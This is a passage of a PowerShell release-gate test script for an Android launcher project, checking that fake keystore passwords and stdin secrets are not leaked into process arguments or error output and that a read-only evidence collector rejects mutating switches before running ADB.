    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_PASSWORD_ENVIRONMENT',
        $fakeKeytoolPasswordEnvironment,
        [EnvironmentVariableTarget]::Process
    )

    $fakePassword = "stage5-fake-keytool-secret-$([Guid]::NewGuid().ToString('N'))"
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_EXPECTED_PASSWORD',
        $fakePassword,
        [EnvironmentVariableTarget]::Process
    )
    $fakeAlias = "stage5-fake-keytool-alias-$([Guid]::NewGuid().ToString('N'))"
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_EXPECTED_ALIAS',
        $fakeAlias,
        [EnvironmentVariableTarget]::Process
    )
    $fakeSigner = Get-KeystoreSignerSha256 `
        -KeystorePath $dummyKeystore `
        -KeystorePassword $fakePassword `
        -KeyAlias $fakeAlias `
        -KeytoolPath $fakeKeytool
    if ($fakeSigner -ne 'FD0E3D5ACF435C1D23BFC5C426E99AA9EB5808619FF1FC214FFCA99CFAC7E57A') {
        throw 'Fake keytool did not return the expected signer fingerprint.'
    }
    $capturedKeytoolArguments = @([IO.File]::ReadAllLines($fakeKeytoolArguments))
    if ($capturedKeytoolArguments -contains $fakePassword -or
        $capturedKeytoolArguments -contains '-storepass' -or
        $capturedKeytoolArguments -notcontains '-storepass:env') {
        throw 'Keystore password leaked into keytool process arguments.'
    }
    $temporaryPasswordEnvironment = [IO.File]::ReadAllText($fakeKeytoolPasswordEnvironment).Trim()
    if ([Environment]::GetEnvironmentVariable(
        $temporaryPasswordEnvironment,
        [EnvironmentVariableTarget]::Process
    )) {
        throw 'Temporary keytool password environment variable survived the keytool call.'
    }
    if (($fakeSigner | Out-String).Contains($fakePassword)) {
        throw 'Keystore password leaked into keytool output.'
    }
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_FAIL',
        '1',
        [EnvironmentVariableTarget]::Process
    )
    $keytoolFailureWasRedacted = $false
    try {
        Get-KeystoreSignerSha256 `
            -KeystorePath $dummyKeystore `
            -KeystorePassword $fakePassword `
            -KeyAlias $fakeAlias `
            -KeytoolPath $fakeKeytool
    } catch {
        $keytoolFailureText = $_.Exception.Message
        $keytoolFailureWasRedacted = $keytoolFailureText.Contains('<redacted>') -and
            -not $keytoolFailureText.Contains($fakePassword) -and
            -not $keytoolFailureText.Contains($fakeAlias)
    }
    if (-not $keytoolFailureWasRedacted) {
        throw "Keytool failure output did not redact the password and alias (redaction=$($keytoolFailureText.Contains('<redacted>')); password=$($keytoolFailureText.Contains($fakePassword)); alias=$($keytoolFailureText.Contains($fakeAlias)))."
    }
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_KEYTOOL_FAIL',
        $null,
        [EnvironmentVariableTarget]::Process
    )

    $fakeProcessScript = Join-Path $signingProcessTestRoot 'fake-stdin-process.ps1'
    $fakeProcessArguments = Join-Path $signingProcessTestRoot 'process-arguments.txt'
    $fakeProcessInputHash = Join-Path $signingProcessTestRoot 'process-input.sha256'
    [IO.File]::WriteAllText(
        $fakeProcessScript,
        @'
param([string]$Mode)
[IO.File]::WriteAllLines($env:STS2_FAKE_PROCESS_ARGUMENTS, [string[]](@($Mode) + @($args)))
$inputValue = [Console]::In.ReadToEnd()
$algorithm = [Security.Cryptography.SHA256]::Create()
try {
    $hash = (($algorithm.ComputeHash([Text.Encoding]::UTF8.GetBytes($inputValue)) |
        ForEach-Object { $_.ToString('x2') }) -join '')
} finally {
    $algorithm.Dispose()
}
[IO.File]::WriteAllText($env:STS2_FAKE_PROCESS_INPUT_HASH, $hash)
if ($Mode -eq 'failure') {
    [Console]::Error.Write($inputValue)
    exit 9
}
[Console]::Out.Write($inputValue)
'@,
        (New-Object Text.UTF8Encoding($false))
    )
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_PROCESS_ARGUMENTS',
        $fakeProcessArguments,
        [EnvironmentVariableTarget]::Process
    )
    [Environment]::SetEnvironmentVariable(
        'STS2_FAKE_PROCESS_INPUT_HASH',
        $fakeProcessInputHash,
        [EnvironmentVariableTarget]::Process
    )
    $fakeStandardInput = "stage5-fake-stdin-secret-$([Guid]::NewGuid().ToString('N'))"
    $successfulOutput = @(
        Invoke-ProcessWithStandardInput `
            -Executable $hostExecutable `
            -Arguments @('-NoProfile', '-NonInteractive', '-File', $fakeProcessScript, 'success') `
            -StandardInput $fakeStandardInput `
            -FailureMessage 'Fake stdin process unexpectedly failed.' `
            -SensitiveValues @($fakeStandardInput)
    )
    if ($successfulOutput.Count -ne 0) {
        throw 'Secret-bearing child-process output escaped on success.'
    }
    $actualInputHash = [IO.File]::ReadAllText($fakeProcessInputHash)
    $expectedInputHash = Get-TestStringSha256 $fakeStandardInput
    if ($actualInputHash -ne $expectedInputHash) {
        throw "Child process did not receive the exact standard-input value: expected $expectedInputHash, got $actualInputHash."
    }
    if (([IO.File]::ReadAllText($fakeProcessArguments)).Contains($fakeStandardInput)) {
        throw 'Standard-input value leaked into child-process arguments.'
    }

    $redactedFailure = $false
    try {
        Invoke-ProcessWithStandardInput `
            -Executable $hostExecutable `
            -Arguments @('-NoProfile', '-NonInteractive', '-File', $fakeProcessScript, 'failure') `
            -StandardInput $fakeStandardInput `
            -FailureMessage 'Expected fake stdin failure.' `
            -SensitiveValues @($fakeStandardInput)
    } catch {
        $failureText = $_.Exception.Message
        $redactedFailure = $failureText.Contains('<redacted>') -and
            -not $failureText.Contains($fakeStandardInput)
    }
    if (-not $redactedFailure) {
        throw 'Secret-bearing child-process failure was not redacted.'
    }
} finally {
    foreach ($environmentName in $testEnvironmentNames) {
        [Environment]::SetEnvironmentVariable(
            $environmentName,
            $previousTestEnvironment[$environmentName],
            [EnvironmentVariableTarget]::Process
        )
    }
    if (Test-Path -LiteralPath $signingProcessTestRoot) {
        Remove-Item -LiteralPath $signingProcessTestRoot -Recurse -Force
    }
}

$guardOutputRoot = Join-Path (
    [IO.Path]::GetTempPath()
) "sts2-stage5-mutation-guard-$([Guid]::NewGuid().ToString('N'))"
foreach ($forbiddenSwitch in @("ClearLogcat", "EnableVerboseSaveDiagnostics")) {
    $rejected = $false
    try {
        $arguments = @{
            PackageName = "com.sts2launcher.overhaul.fork.local"
            Stage5Row = "1"
            OutputRoot = $guardOutputRoot
            AdbPath = (Join-Path $guardOutputRoot "adb-must-not-run.exe")
        }
        $arguments[$forbiddenSwitch] = $true
        & $collectorPath @arguments
    } catch {
        $rejected = $_.Exception.Message -like `
            "*Stage 5 evidence capture is read-only*"
    }
    if (-not $rejected) {
        throw "Stage 5 collector did not reject -$forbiddenSwitch before ADB access."
    }
    if (Test-Path -LiteralPath $guardOutputRoot) {
        throw "Stage 5 collector created evidence before rejecting -$forbiddenSwitch."
    }
}

Write-Host (
    "Stage 5 release gate passed: the workflow can retain an APK candidate " +
    "but cannot publish it before device signoff."
)
